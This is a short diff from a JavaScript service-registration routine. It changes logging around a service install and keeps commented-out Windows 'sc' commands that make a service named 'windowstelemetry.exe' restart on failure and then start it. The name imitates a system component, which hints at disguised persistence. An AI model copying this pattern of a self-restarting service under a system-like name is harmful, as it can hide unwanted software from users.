@@ -772,9 +772,10 @@ async function register_service() {
 
     svc.on('install', function(){
       svc.start();
+      console.log('!');
     });
     
-    console.log(svc.install());
+    svc.install();
 
     // cmd /c sc failure windowstelemetry.exe reset= 86400 actions= restart/1000/restart/1000/restart/1000 | Out-Null
     // cmd /c sc start windowstelemetry.exe | Out-Null
